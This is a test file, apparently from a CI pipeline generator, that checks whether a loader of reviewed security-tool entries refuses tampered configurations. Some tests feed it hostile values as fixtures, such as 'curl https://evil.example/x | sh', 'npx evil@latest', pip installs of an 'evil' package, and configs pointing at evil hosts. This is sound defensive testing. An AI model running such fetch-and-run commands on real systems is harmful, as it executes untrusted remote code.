    [17, 'trivy --disable-telemetry= (empty)', (d) => { trivy(d).step.cli.command.push('--disable-telemetry='); }, /is a switch/],
    [18, 'trivy --disable-telemetry=0 later', (d) => { trivy(d).step.cli.command.push('--disable-telemetry=0'); }, /--disable-telemetry in effect/],
    [19, 'trivy -o swallows --skip-version-check', (d) => {
      const c = trivy(d).step.cli.command;
      c.splice(c.indexOf('--skip-version-check'), 0, '-o');
    }, /--skip-version-check in effect/],
    [20, 'trivy -qfsarif (bundled shorthands)', (d) => { trivy(d).step.cli.command.push('-qfsarif'); }, ALLOW],
    [21, 'trivy config YAML db.repository', trivyConf('trivy-image', 'db:\n  repository: ghcr.io/evil/trivy-db\n'), /may set only cache.backend: memory, not db.repository/],
    [22, 'trivy config YAML server.addr', trivyConf('trivy-image', 'server:\n  addr: http://evil.example\n'), /not server.addr/],
    [23, 'trivy config YAML checks-bundle-repository', trivyConf('trivy-config', 'misconfiguration:\n  checks-bundle-repository: ghcr.io/evil/checks\n'), /not misconfiguration.checks-bundle-repository/],
    [24, 'trivy config YAML disable-telemetry: false', trivyConf('trivy-image', 'disable-telemetry: false\n'), /not disable-telemetry/],
    [25, 'nuclei -cup', nucAt('-cup'), /never upload/],
    [26, 'nuclei --cup=true', withAdded(pnuclei, (e) => e.step.cli.command.splice(1, 0, '--cup=true')), /never upload/],
    [27, 'nuclei -duc=false later', withAdded(pnuclei, (e) => e.step.cli.command.splice(2, 0, '-duc=false')), /-duc \(no update check\) in effect/],
    [28, 'nuclei target before -duc', withAdded(pnuclei, (e) => { e.step.cli.command = ['nuclei', 'http://x', '-duc', '-t', NUCLEI_DIR]; }), /-duc \(no update check\) in effect/],
    [29, 'nuclei -- then -duc', withAdded(pnuclei, (e) => { e.step.cli.command = ['nuclei', '-t', NUCLEI_DIR, '--', '-duc']; }), /fixed arg|-duc/],
    [30, 'nuclei second -t elsewhere', nucAt('-t', '/tmp/x'), /pinned archive/],
    [31, 'nuclei -t= empty', nucAt('-t='), /pinned archive/],
    [32, 'nuclei -version', nucAt('-version'), ALLOW],
    [33, 'nuclei -tl (list templates)', nucAt('-tl'), ALLOW],
    [34, 'nuclei -V key=value (not allowlisted)', withAdded(pnuclei, (e) => e.step.cli.command.splice(1, 0, '-V', 'a=b')), ALLOW],
    [35, 'P12: jscpd with no verifiedWith loads', withAdded(pjscpd, (e) => { delete e.verifiedWith; }), ACCEPT],
  ];
  it.each(probesR1)('re-review probe #%i: %s', (_n, _name, mutate, refusal) => {
    const doc = structuredClone(rawFile()) as Doc;
    mutate(doc);
    const dir = makeTempDir();
    writeIn(dir, 'reviewed-tools.yml', stringify(doc));
    const path = `${dir}/reviewed-tools.yml`;
    if (refusal === null) expect(loadReviewed(path).length).toBeGreaterThan(20);
    else expect(() => loadReviewed(path)).toThrow(refusal);
  });

  it.each(probes)('probe #%i: %s', (_n, _name, mutate, refusal) => {
    const doc = structuredClone(rawFile()) as Doc;
    mutate(doc);
    const dir = makeTempDir();
    writeIn(dir, 'reviewed-tools.yml', stringify(doc));
    const path = `${dir}/reviewed-tools.yml`;
    if (refusal === null) expect(loadReviewed(path).length).toBeGreaterThan(20);
    else expect(() => loadReviewed(path)).toThrow(refusal);
  });
});

// ---------- the real list ----------

describe('data/reviewed-tools.yml', () => {
  it('reviewed: checkout entry has persist-credentials false; no actions/cache entry', () => {
    const list = real();
    const checkout = byId(list, 'actions-checkout');
    expect(checkout).toHaveLength(1);
    expect(checkout[0]?.fixedInputs.with?.[PERSIST]).toBe('false');
    expect(checkout[0]?.step.action?.with[PERSIST]).toBe('false');
    for (const t of list) {
      expect(t.candidate.repo.toLowerCase(), t.id).not.toBe('actions/cache');
      expect(t.step.action?.uses ?? '', t.id).not.toMatch(/^actions\/cache[@/]/i);
    }
    // the loader refuses both mistakes
    const leaky = actionEntry({ id: 'actions-checkout', repo: 'actions/checkout' });
    leaky.fixedInputs = { with: {} };
    leaky.step.action.with = {};
    leaky.choices = {};
    rejects([leaky], /persist-credentials/);
    const cache = actionEntry({ id: 'actions-cache', repo: 'actions/cache' });
    rejects([cache], /cache/);
  });

  it('reviewed: platform entries for docker login/buildx/build-push, upload-sarif and attest v4 present and pinned', () => {
    const list = real();
    const want = {
      'docker-login-action': 'docker/login-action', 'docker-setup-buildx-action': 'docker/setup-buildx-action',
      'docker-build-push-action': 'docker/build-push-action', 'codeql-upload-sarif': 'github/codeql-action', 'actions-attest': 'actions/attest',
    };
    for (const [id, repo] of Object.entries(want)) {
      const [t] = byId(list, id);
      expect(t, id).toBeDefined();
      expect(t?.candidate.repo).toBe(repo);
      expect(t?.candidate.kind).toBe('action');
      expect(t?.candidate.pin.sha).toMatch(/^[0-9a-f]{40}$/);
      expect(t?.step.action?.uses.endsWith(`@${t?.candidate.pin.sha}`)).toBe(true);
    }
    expect(byId(list, 'codeql-upload-sarif')[0]?.step.action?.uses).toMatch(/^github\/codeql-action\/upload-sarif@/);
    expect(byId(list, 'actions-attest')[0]?.candidate.version).toMatch(/^v4\.\d+\.\d+$/);
    expect(byId(list, 'actions-attest')[0]?.categories).toEqual(expect.arrayContaining(['platform', 'attestation']));
    expect(byId(list, 'docker-build-push-action')[0]?.categories).toEqual(expect.arrayContaining(['platform', 'image-build']));
  });

  it('reviewed: platform entries use output { path: \'\', format: \'none\' }', () => {
    const platform = real().filter((t) => t.categories.includes('platform'));
    expect(platform.length).toBeGreaterThanOrEqual(Object.keys(PLATFORM_ACTION_IDS).length);
    for (const t of platform) expect(t.step.output, t.id).toEqual({ path: '', format: 'none' });
    // the loader refuses a platform entry with a scan output
    const bad = actionEntry();
    bad.step.output = { path: 'x.sarif', format: 'sarif' };
    rejects([bad]);
  });

  it('reviewed: every PLATFORM_ACTION_IDS id has exactly one platform entry', () => {
    const list = real();
    for (const id of Object.values(PLATFORM_ACTION_IDS)) {
      const matches = byId(list, id);
      expect(matches, id).toHaveLength(1);
      expect(matches[0]?.categories, id).toContain('platform');
      expect(matches[0]?.candidate.kind, id).toBe('action');
    }
  });

  it('reviewed: no gate or watcher entry in v0.1 (Plan C and Plan H add them)', () => {
    for (const t of real()) {
      expect(t.categories, t.id).not.toContain('gate');
      expect(t.id, t.id).not.toMatch(/gate|watcher/i);
      expect(t.candidate.repo.toLowerCase(), t.id).not.toMatch(/(^|\/)pipegen/);
    }
  });

  it('reviewed: no entry for project scripts; projectScriptFor returns the built-in kind with no pin', () => {
    for (const t of real()) {
      // the project's own test script is a built-in step (no reviewed entry); lint and format-lint have reviewed
    // entries since Plan P Task 6 (biome, eslint, ruff; ruling P17), and projectScriptFor still comes first for them
    for (const c of ['unit-tests', 'full-tests']) expect(t.categories, t.id).not.toContain(c);
    }
    const step = projectScriptFor(need('unit-tests', { service: 'web' }), svc());
    expect(step).toEqual({ kind: 'project-script', needId: 'unit-tests', service: 'web', script: 'test', workingDir: 'apps/web' });
    expect(Object.keys(step ?? {})).not.toContain('pin');
    expect(Object.keys(step ?? {})).not.toContain('tool');
  });

  it('reviewed: the starting entries are all there, pinned, PENDING-or-reviewed, with S24 egress', () => {
    const list = real();
    const ids = list.map((t) => t.id);
    for (const id of [
      ...Object.values(PLATFORM_ACTION_IDS), 'bullfrog', 'registry', 'zap-baseline', 'trivy-config', 'trivy-image', 'gitleaks', 'semgrep',
      'osv-scanner', 'lefthook', 'syft', 'cosign', 'actionlint', 'zizmor',
    ]) expect(ids, id).toContain(id);
    expect(new Set(ids).size).toBe(ids.length);
    expect(byId(list, 'bullfrog')[0]?.categories).toEqual(['egress']);
    expect(byId(list, 'trivy-config')[0]?.categories).toEqual(['iac']);
    expect(byId(list, 'trivy-image')[0]?.categories).toEqual(['image-scan']);
    expect(byId(list, 'zap-baseline')[0]?.step.output.format).toBe('zap-json');
    for (const id of ['actionlint', 'zizmor']) expect(byId(list, id)[0]?.categories).toEqual(['workflow-lint']);
    // the trivy entries never use a cache between runs
    for (const id of ['trivy-config', 'trivy-image']) expect(JSON.stringify(byId(list, id)[0]?.fixedInputs)).toMatch(/cache/i);
  });

  it('reviewed: tools also in pinned-binaries.yml have the same version and hash (S25)', () => {
    const list = real();
    expect(checkPinnedAgainstReviewed(loadPinnedBinaries(), list)).toEqual([]);
    // every pinned binary really is in the reviewed list (so the check above compared something)
    for (const repo of ['gitleaks/gitleaks', 'rhysd/actionlint', 'sigstore/cosign']) {
      expect(list.filter((t) => t.candidate.kind === 'cli' && t.candidate.repo === repo), repo).toHaveLength(1);
    }
  });

  it('reviewed: zap baseline runs with -silent, so no add-on is downloaded at run time (I1)', () => {
    const zap = byId(real(), 'zap-baseline')[0];
    const cmd = zap?.step.cli?.command ?? [];
    expect(cmd[cmd.indexOf('-z') + 1]).toBe('-silent');
    expect(zap?.fixedInputs.args?.join(' ')).toContain('-z -silent');
    // the loader refuses a ZAP command without it
    const raw = rawFile().tools.find((t) => t.id === 'zap-baseline') as Entry;
    const loud = structuredClone(raw);
    loud.step.cli.command = ['zap-baseline.py', '-J', 'zap.json'];
    loud.fixedInputs.args = ['-J', 'zap.json'];
    rejects([loud], /-silent/);
    // zap-baseline.py keeps the LAST -z: exactly one -z, and its value is -silent (N2)
    const twice = structuredClone(raw);
    twice.step.cli.command = ['zap-baseline.py', '-J', 'zap.json', '-z', '-silent', '-z', '-addoninstall x'];
    rejects([twice], /-silent/);
    const extra = structuredClone(raw);
    extra.step.cli.command = ['zap-baseline.py', '-J', 'zap.json', '-z', '-silent -addoninstall x'];
    extra.fixedInputs.args = ['-J', 'zap.json', '-z', '-silent -addoninstall x'];
    rejects([extra], /-silent/);
  });

  it('reviewed: egress entry has enable-sudo false and block (S8: Bullfrog, not Harden-Runner)', () => {
    const list = real();
    const egress = list.filter((t) => t.categories.includes('egress'));
    expect(egress.map((t) => t.id)).toEqual(['bullfrog']);
    const bf = egress[0];
    expect(bf?.candidate.repo).toBe('bullfrogsec/bullfrog');
    const fixed = { 'egress-policy': 'block', 'dns-policy': 'allowed-domains-only', 'enable-sudo': 'false' };
    expect(bf?.fixedInputs.with).toMatchObject(fixed);
    expect(bf?.step.action?.with).toMatchObject(fixed);
    expect(Object.keys(bf?.choices ?? {}).sort()).toEqual(['allowed-domains', 'allowed-ips']); // the renderer fills the allow-list
    // Harden-Runner's free tier failed open on private repos (S8), and trivy-action's tags were hijacked: neither is listed
    for (const t of list) expect(['step-security/harden-runner', 'aquasecurity/trivy-action', 'aquasecurity/setup-trivy'], t.id).not.toContain(t.candidate.repo.toLowerCase());
    // the loader refuses a Bullfrog entry that leaves sudo on, audits only, or resolves any name
    const raw = rawFile().tools.find((t) => t.id === 'bullfrog') as Entry;
    for (const [key, weak] of [['enable-sudo', 'true'], ['egress-policy', 'audit'], ['dns-policy', 'any']]) {
      const loose = structuredClone(raw);
      loose.fixedInputs.with[key] = weak;
      loose.step.action.with[key] = weak;
      rejects([loose], new RegExp(key));
    }
    // only the three fixed inputs and the two allow-list choices: no api-token or control-plane setting (N1)
    const withPlaneKey = structuredClone(raw);
    const planeKey = ['api', 'to' + 'ken'].join('-');
    withPlaneKey.fixedInputs.with[planeKey] = 'x';
    withPlaneKey.step.action.with[planeKey] = 'x';
    rejects([withPlaneKey], new RegExp(planeKey));
    const plane = structuredClone(raw);
    plane.choices['_control-plane-api-base-url'] = ['https://example.invalid/'];
    rejects([plane], /_control-plane/);
    const stepOnly = structuredClone(raw);
    stepOnly.step.action.with['collect-process-info'] = 'false';
    rejects([stepOnly], /collect-process-info/);
  });

  it('reviewed: build-push fixes context "." and an empty github-token, so the job credential is no build secret (I3)', () => {
    const bp = byId(real(), 'docker-build-push-action')[0];
    expect(bp?.fixedInputs.with).toMatchObject({ context: '.', 'github-token': '' });
    expect(bp?.step.action?.with).toMatchObject({ context: '.', 'github-token': '' });
    const raw = rawFile().tools.find((t) => t.id === 'docker-build-push-action') as Entry;
    for (const key of ['context', 'github-token']) {
      const missing = structuredClone(raw);
      delete missing.fixedInputs.with[key];
      delete missing.step.action.with[key];
      rejects([missing], new RegExp(key));
    }
    const other = structuredClone(raw);
    other.fixedInputs.with.context = 'https://github.com/o/r.git';
    other.step.action.with.context = 'https://github.com/o/r.git';
    rejects([other], /context/);
  });

  it('reviewed: scanner flags that keep runs offline and unsuppressed (M1, M7)', () => {
    const list = real();
    const cmd = (id: string) => byId(list, id)[0]?.step.cli?.command ?? [];
    const fixed = (id: string) => byId(list, id)[0]?.fixedInputs.args ?? [];
    expect(cmd('trivy-config')).toContain('--skip-check-update'); // the checks embedded in the pinned binary
    expect(fixed('trivy-config')).toContain('--skip-check-update');
    expect(cmd('gitleaks')).toContain('--ignore-gitleaks-allow'); // inline gitleaks:allow comments can't hide a secret
    expect(fixed('gitleaks')).toContain('--ignore-gitleaks-allow');
    for (const f of ['-shellcheck=', '-pyflakes=']) {
      expect(cmd('actionlint')).toContain(f); // no external tools from the runner's PATH
      expect(fixed('actionlint')).toContain(f);
    }
    // DECISIONS #79: pipegen's actionlint config ignores only the cache-mode key actionlint 1.7.12 rejects
    const config = byId(list, 'actionlint')[0]?.fixedInputs.config?.content ?? '';
    expect(parse(config)).toEqual({
      'self-hosted-runner': { labels: [] },
      paths: { '.github/workflows/**/*.{yml,yaml}': { ignore: ['unexpected key "cache-mode" for "job" section'] } },
    });
  });

  // ---- Plan P Task 6 (pin day) ----
  /**
   * Catalogue §4 "Add" at the catalogue version (verification.md R1), id → [repo, version, plugins]. Not entries, on
   * purpose (rulings PS28, PS32): tsc and Jest are the repo's own tools (RepoToolStep, DECISIONS #95), Dependabot and
   * npm trusted publishing are built-in steps (Plan P Task 8), and the pull request's OSV diff is the extra category
   * dependency-review on osv-scanner.
   */
  const CATALOGUE: Record<string, [string, string, string[]]> = {
    betterleaks: ['betterleaks/betterleaks', 'v1.9.0', []],
    biome: ['biomejs/biome', '2.5.15', ['@biomejs/cli-linux-x64@2.5.15']],
    eslint: ['eslint/eslint', '10.13.0', []],
    'eslint-typescript': ['eslint/eslint', '10.13.0', ['typescript-eslint@8.72.0']],
    'oxlint-typeaware': ['oxc-project/oxc', '1.89.0', ['@oxlint/binding-linux-x64-gnu@1.89.0', 'oxlint-tsgolint@7.0.2004', '@oxlint-tsgolint/linux-x64@7.0.2004']],
    prettier: ['prettier/prettier', '3.9.10', []],
    'vitest-coverage': ['vitest-dev/vitest', '5.0.5', ['@vitest/coverage-v8@5.0.5']],
    c8: ['bcoe/c8', '12.0.0', []],
    knip: ['webpro-nl/knip', '6.42.1', []],
    jscpd: ['kucherenko/jscpd', 'v5.4.2', []],
    'trivy-licence': ['aquasecurity/trivy', 'v0.76.0', []],
    'dependency-review-action': ['actions/dependency-review-action', 'v5.0.0', []],
    hadolint: ['hadolint/hadolint', 'v2.15.1', []],
    'kube-linter': ['stackrox/kube-linter', 'v0.8.3', []],
    schemathesis: ['schemathesis/schemathesis', '4.32.2', []],
    nuclei: ['projectdiscovery/nuclei', 'v3.11.1', []],
    'scorecard-action': ['ossf/scorecard-action', 'v2.5.0', []],
    pinact: ['suzuki-shunsuke/pinact', 'v5.0.0', []],
    poutine: ['boostsecurityio/poutine', 'v1.1.6', []],
    gosec: ['securego/gosec', 'v2.29.0', []],
    ruff: ['astral-sh/ruff', '0.17.1', []],
    'ruff-format': ['astral-sh/ruff', '0.17.1', []],
    mypy: ['python/mypy', '2.4.0', []],
    'coverage-py': ['coveragepy/coveragepy', '7.16.2', []],
    creosote: ['fredrikaverpil/creosote', '5.2.0', []],
    vulture: ['jendrikseipp/vulture', '2.16', []],
    bandit: ['PyCQA/bandit', '1.9.4', ['sarif-om@1.0.4', 'jschema-to-python@1.2.3']],
    'pypi-publish': ['pypa/gh-action-pypi-publish', 'v1.14.3', []],
  };

  it('data: every catalogue §4 entry is present at the catalogue version (minus the PS28/PS32 exceptions)', () => {
    const list = real();
    for (const [id, [repo, version, plugins]] of Object.entries(CATALOGUE)) {
      const t = byId(list, id);
      expect(t, id).toHaveLength(1);
      expect(t[0]?.candidate.repo, id).toBe(repo);
      expect(t[0]?.candidate.version, id).toBe(version);
      expect((t[0]?.step.cli?.plugins ?? []).map((p) => `${p.package}@${p.version}`), id).toEqual(plugins);
    }
    // the exceptions are not entries
    for (const t of list) expect(['typescript', 'jest', 'dependabot', 'tsc'], t.id).not.toContain(t.id);
    expect(byId(list, 'osv-scanner')[0]?.categories).toEqual(['deps', 'dependency-review']);
    // npm packages as the brief names them
    const pkg = (id: string) => byId(list, id)[0]?.step.cli?.install;
    expect(pkg('biome')).toMatchObject({ method: 'npm', package: '@biomejs/biome' });
    expect(pkg('oxlint-typeaware')).toMatchObject({ method: 'npm', package: 'oxlint' });
    expect(pkg('coverage-py')).toMatchObject({ method: 'pip', package: 'coverage' });
    expect(pkg('jscpd')).toMatchObject({ method: 'github-release', package: 'jscpd-linux-x64-gnu.tar.gz' }); // PS27: the binary
    expect(pkg('nuclei')).toMatchObject({ method: 'github-release', package: 'nuclei_3.11.1_linux_amd64.zip' }); // P5
    expect(pkg('kube-linter')).toMatchObject({ method: 'github-release', package: 'kube-linter-linux' }); // PS31
    expect(pkg('hadolint')).toMatchObject({ method: 'github-release', package: 'hadolint-linux-x86_64' }); // PS31
    // nuclei-templates v10.5.0, its tag archive and the sha256 its release lists (PS30, P3)
    expect(byId(list, 'nuclei')[0]?.fixedInputs.env).toEqual({
      PIPEGEN_NUCLEI_TEMPLATES_URL: 'https://github.com/projectdiscovery/nuclei-templates/archive/refs/tags/v10.5.0.tar.gz',
      PIPEGEN_NUCLEI_TEMPLATES_SHA256: '80fbabceca095fac40afecc7f023748df22b9576b9ff10a4422bd2fbf81f9a41',
    });
  });

  it('data: every new entry is PENDING with proofs 0', () => {
    const list = real();
    for (const id of Object.keys(CATALOGUE)) {
      const t = byId(list, id)[0];
      expect(t?.reviewedBy, id).toBe('PENDING');
      expect(t?.reviewedAt, id).toBe('PENDING');
      expect(t?.proofs, id).toBe(0);
    }
  });

  it('data: setup-node offers exactly 24 and 26 (DECISIONS #92)', () => {
    expect(byId(real(), 'actions-setup-node')[0]?.choices['node-version']).toEqual(['24', '26']);
  });

  it('data: every trivy entry carries the three flags and a verifiedWith; no entry uses a never-list repo', () => {
    const list = real();
    const trivies = list.filter((t) => t.candidate.repo === 'aquasecurity/trivy');
    expect(trivies.map((t) => t.id).sort()).toEqual(['trivy-config', 'trivy-image', 'trivy-licence']);
    for (const t of trivies) {
      for (const f of TRIVY_FLAGS) {
        expect(t.step.cli?.command, `${t.id} ${f}`).toContain(f);
        expect(t.fixedInputs.args, `${t.id} ${f}`).toContain(f);
      }
      expect(t.verifiedWith, t.id).toMatchObject({ method: 'cosign-bundle', asset: 'trivy_0.76.0_checksums.txt' });
    }
    expect(byId(list, 'trivy-image')[0]?.choices['ignore-unfixed']).toEqual(['false', 'true']);
    expect(byId(list, 'trivy-licence')[0]?.fixedInputs.args).toEqual(expect.arrayContaining(['--scanners', 'license', '--severity', 'HIGH,CRITICAL', '--exit-code', '1']));
    for (const t of list) {
      expect(neverListed(t.candidate.repo), t.id).toBeNull();
      if (t.step.action !== undefined) expect(neverListed(t.step.action.uses), t.id).toBeNull();
    }
  });

  it('data: the first pick per category follows file order: betterleaks before gitleaks, zap-baseline before nuclei, semgrep before bandit, ruff for Python lint (PS31)', () => {
    const list = real();
    const first = (category: string, language: Language) => reviewedFor(need(category), language, list, 'audit')[0]?.id;
    const ids = list.map((t) => t.id);
    expect(ids.indexOf('betterleaks')).toBeLessThan(ids.indexOf('gitleaks'));
    expect(first('secrets', 'node')).toBe('betterleaks');
    expect(reviewedFor(need('secrets'), 'node', list, 'audit').map((t) => t.id)).toEqual(['betterleaks', 'gitleaks']);
    expect(first('dast', 'node')).toBe('zap-baseline');
    expect(first('sast', 'python')).toBe('semgrep');
    expect(first('sast', 'go')).toBe('gosec');
    expect(first('lint', 'python')).toBe('ruff');
    expect(first('format', 'python')).toBe('ruff-format');
    expect(first('format-lint', 'node')).toBe('biome');
    expect(first('attestation', 'python')).toBe('actions-attest');
    expect(first('dependency-review', 'node')).toBe('osv-scanner');
  });

  it('data: loadReviewed accepts the file; checkPinnedAgainstReviewed reports no problem; signature checks as ruled (P12, P16)', () => {
    const list = real();
    expect(list.length).toBeGreaterThanOrEqual(23 + Object.keys(CATALOGUE).length);
    expect(checkPinnedAgainstReviewed(loadPinnedBinaries(), list)).toEqual([]);
    const file = rawFile();
    const pinnedDay = file.pinnedOn.slice(0, 10);
    for (const t of list) {
      const must = [...MUST_VERIFY].some((r) => t.candidate.repo.toLowerCase() === r);
      expect(t.verifiedWith !== undefined, t.id).toBe(must);
      if (t.verifiedWith !== undefined) expect(t.verifiedWith.verifiedOn, t.id).toBe(pinnedDay);
    }
    // key-based checks (P10): the upstream key file at the entry's tag, pinned by its sha256
    expect(byId(list, 'kube-linter')[0]?.verifiedWith).toEqual({
      kind: 'cosign-key', keyUrl: 'https://raw.githubusercontent.com/stackrox/kube-linter/v0.8.3/kubelinter-cosign.pub',
      keySha256: 'db5fb95bf3e1d432a3e9153abcc75ca4985aad1e44f414b8ebc624a2fac97ba0', verifiedOn: pinnedDay,
    });
    expect(byId(list, 'gosec')[0]?.verifiedWith).toEqual({
      kind: 'cosign-key', keyUrl: 'https://raw.githubusercontent.com/securego/gosec/v2.29.0/cosign.pub',
      keySha256: '4f9553257dbbb9f07c830da7773e49ae7150962f6d6d187d6243f95002d497fb', verifiedOn: pinnedDay,
    });
    // pypi-publish never takes a password; betterleaks reports to its SARIF file with a fixed exit code
    const pub = byId(list, 'pypi-publish')[0];
    expect(Object.keys(pub?.step.action?.with ?? {})).toEqual(['attestations']);
    const bl = byId(list, 'betterleaks')[0];
    expect(bl?.fixedInputs.args).toEqual(expect.arrayContaining(['--report-path', 'betterleaks.sarif', '--exit-code', '1']));
  });

  it(`reviewed-tools.yml: every release was at least ${COOLDOWN_DAYS} days old when pinned (S26)`, () => {
    const file = rawFile();
    const pinnedOn = Date.parse(file.pinnedOn);
    expect(Number.isFinite(pinnedOn)).toBe(true);
    for (const t of file.tools) {
      const at = Date.parse(t.releasedAt);
      expect(Number.isFinite(at), t.id).toBe(true);
      expect(pinnedOn - at, t.id).toBeGreaterThanOrEqual(COOLDOWN_DAYS * DAY);
    }
    // the loader refuses an entry released less than the cooldown before pinnedOn
    const young = cliEntry();
    young.releasedAt = '2026-10-20T00:00:00Z'; // the fixture list is pinned on 2026-10-26
    rejects([young], /cooldown/);
  });
});

// ---------- Task 6 review, fix round 1 (rulings P19-P27): the review's probes as tests ----------

describe('Task 6 review fix round 1 (P19-P27)', () => {
  /** A real entry, cloned, changed, and loaded alone with the real list's pinnedOn (so the real releases pass the cooldown). */
  const realEntry = (id: string): Entry => structuredClone(rawFile().tools.find((t) => t.id === id) as Entry);
  const loadAt = (tools: Entry[]) => {
    const dir = makeTempDir();
    writeIn(dir, 'reviewed-tools.yml', stringify({ pinnedOn: rawFile().pinnedOn, tools }));
    return loadReviewed(`${dir}/reviewed-tools.yml`);
  };
  const refused = (e: Entry, why: RegExp) => expect(() => loadAt([e])).toThrow(why);
  /** Sets the same words in the command and the fixed args (a change a careless edit would make in both places). */
  const both = (e: Entry, change: (xs: string[]) => string[]) => {
    e.step.cli.command = [e.step.cli.command[0], ...change(e.step.cli.command.slice(1))];
    e.fixedInputs.args = change(e.fixedInputs.args ?? []);
    return e;
  };
  const without = (...drop: string[]) => (xs: string[]) => xs.filter((x) => !drop.includes(x));
  /** Flags go first, so Go-style tools (which stop at the first path) read them as flags too. */
  const plus = (...add: string[]) => (xs: string[]) => [...add, ...xs];
  const swap = (from: string, to: string) => (xs: string[]) => xs.map((x) => (x === from ? to : x));

  it('P19 (C1): every real cli entry has an argv allowlist, and runs exactly its own executable', () => {
    const cli = rawFile().tools.filter((t) => t.candidate.kind === 'cli');
    expect(cli.length).toBeGreaterThan(30);
    for (const t of cli) {
      expect(Object.hasOwn(ARGV_POLICIES, t.id), t.id).toBe(true);
      expect(t.step.cli.command[0], t.id).toBe(ARGV_POLICIES[t.id]?.exe);
    }
    expect(loadAt(cli)).toHaveLength(cli.length);
  });

  it('P19 (C1, probes 1-4, 20, 27): launchers, shells, package managers, paths, renamed binaries and unknown ids are refused', () => {
    const RUNS = /runs \S+ itself as command\[0\]/;
    for (const id of ['biome', 'eslint', 'prettier', 'knip', 'ruff', 'mypy', 'gosec', 'hadolint', 'coverage-py', 'schemathesis', 'bandit']) {
      const e = realEntry(id);
      e.step.cli.command = ['npx', 'evil@latest'];
      e.fixedInputs.args = [];
      refused(e, RUNS);
    }
    const shell = realEntry('biome');
    shell.step.cli.command = ['sh', '-c', 'curl https://evil.example/x | sh'];
    shell.fixedInputs.args = [];
    refused(shell, RUNS);
    const pip = realEntry('ruff');
    pip.step.cli.command = ['pip', 'install', 'evil'];
    pip.fixedInputs.args = [];
    refused(pip, RUNS);
    const py = realEntry('mypy');
    py.step.cli.command = ['python', '-m', 'pip', 'install', 'x'];
    py.fixedInputs.args = [];
    refused(py, RUNS);
    for (const exe of ['gosec2', '/usr/bin/gosec', './gosec', 'GOSEC']) {
      const e = realEntry('gosec');
      e.step.cli.command = [exe, ...e.step.cli.command.slice(1)];
      refused(e, RUNS);
    }
    // a look-alike under its own id has no allowlist (probe 27): refused, verifiedWith or not
    const look = realEntry('gosec');
    look.id = 'gosec2';
    look.candidate.id = 'gosec2';
    look.candidate.repo = 'evil/gosec2';
    look.candidate.name = 'evil/gosec2';
    look.step.cli.command = ['gosec2', ...look.step.cli.command.slice(1)];
    delete look.verifiedWith;
    refused(look, /verifiedWith is required/); // still gosec's tool (T5)
    look.verifiedWith = { kind: 'cosign-key', keyUrl: 'https://raw.githubusercontent.com/evil/gosec2/v2.29.0/cosign.pub', keySha256: SUM, verifiedOn: rawFile().pinnedOn.slice(0, 10) };
    refused(look, /no argv allowlist/); // and now refused for its id: no allowlist (P19)
    // mypy's --install-types installs unpinned stub packages from PyPI
    refused(both(realEntry('mypy'), plus('--install-types', '--non-interactive')), /allowlist, ruling P19/);
    // a word the template may not name (a second program, a script)
    refused(both(realEntry('coverage-py'), swap('pytest', 'evilmodule')), /may name only pytest/);
    // the pinned ESLint config is executable JS: only the reviewed content (probe 20)
    const imp = realEntry('eslint-typescript');
    imp.fixedInputs.config.content = "import x from 'eslint-plugin-evil';\nexport default [x];\n";
    refused(imp, /exactly the content reviewed/);
    // short forms and abbreviations are refused (argparse would expand --exit to --exit-zero)
    refused(both(realEntry('bandit'), plus('--exit')), /allowlist, ruling P19/);
    refused(both(realEntry('ruff'), plus('-e')), /allowlist, ruling P19/);
  });

  it('P20 (I1, probes 5-13, 15, 16): flags, env and configs that turn failing off are refused, tool by tool', () => {
    const NOPE = /allowlist, ruling P19|ruling P20|in effect|exactly the content reviewed|gets no env|placeholder/;
    const cases: [string, (e: Entry) => Entry][] = [
      ['gosec', (e) => both(e, plus('-no-fail'))],
      ['gosec', (e) => { e.choices = { 'no-fail': ['true'] }; return e; }],
      ['hadolint', (e) => both(e, plus('--no-fail'))],
      ['hadolint', (e) => both(e, swap('warning', 'none'))],
      ['hadolint', (e) => both(e, plus('-t', 'none'))],
      ['hadolint', (e) => { e.step.cli.env = { HADOLINT_NOFAIL: '1' }; return e; }],
      ['hadolint', (e) => { e.fixedInputs.config.content = 'failure-threshold: none\n'; return e; }],
      ['bandit', (e) => both(e, plus('--exit-zero'))],
      ['bandit', (e) => both(e, plus('-lll'))],
      ['ruff', (e) => both(e, plus('--exit-zero'))],
      ['ruff', (e) => both(e, plus('--fix', '--exit-zero'))],
      ['ruff-format', (e) => both(e, without('--check'))],
      ['prettier', (e) => both(e, swap('--check', '--write'))],
      ['eslint', (e) => both(e, swap('0', '9999'))],
      ['eslint', (e) => both(e, plus('--fix'))],
      ['poutine', (e) => both(e, without('--fail-on-violation'))],
      ['pinact', (e) => both(e, without('--check'))],
      ['biome', (e) => both(e, plus('--linter-enabled=false', '--formatter-enabled=false'))],
      ['biome', (e) => { e.step.cli.command = ['biome', 'check', '--write']; return e; }],
      ['oxlint-typeaware', (e) => both(e, without('--deny-warnings'))],
      ['oxlint-typeaware', (e) => { e.fixedInputs.config.content = '{ "categories": { "correctness": "off" } }\n'; return e; }],
      ['kube-linter', (e) => { e.fixedInputs.config.content = 'checks:\n  doNotAutoAddDefaults: true\n'; return e; }],
      ['c8', (e) => both(e, without('--check-coverage'))],
      ['vitest-coverage', (e) => both(e, without('--coverage'))],
      ['schemathesis', (e) => both(e, swap('25', '1'))],
      ['schemathesis', (e) => { e.step.cli.command.push('--header', `${'Author' + 'ization'}: ${'x'}`); return e; }],
      ['knip', (e) => { e.step.cli.command.push('--no-exit-code'); return e; }],
      ['vulture', (e) => both(e, swap('80', '100'))],
    ];
    for (const [id, change] of cases) refused(change(realEntry(id)), NOPE);
    // each changed entry is refused, the unchanged one loads
    for (const id of new Set(cases.map(([id]) => id))) expect(loadAt([realEntry(id)]), id).toHaveLength(1);
  });

  it('P20 (I2, probe 14): trivy --exit-code is exactly 1 in the command and the fixed args, never a choice; every severity includes CRITICAL', () => {
    const EXIT = /--exit-code 1, exactly/;
    refused(both(realEntry('trivy-licence'), swap('1', '0')), EXIT);
    refused(both(realEntry('trivy-licence'), (xs) => xs.filter((x, i) => x !== '--exit-code' && xs[i - 1] !== '--exit-code')), EXIT);
    refused(both(realEntry('trivy-image'), swap('1', '256')), EXIT);
    const fixedOnly = realEntry('trivy-config');
    fixedOnly.fixedInputs.args = without('--exit-code', '1')(fixedOnly.fixedInputs.args);
    refused(fixedOnly, EXIT);
    const choice = realEntry('trivy-image');
    choice.choices['exit-code'] = ['0', '1'];
    refused(choice, /exit-code/);
    refused(both(realEntry('trivy-licence'), swap('HIGH,CRITICAL', 'UNKNOWN')), /includes CRITICAL/);
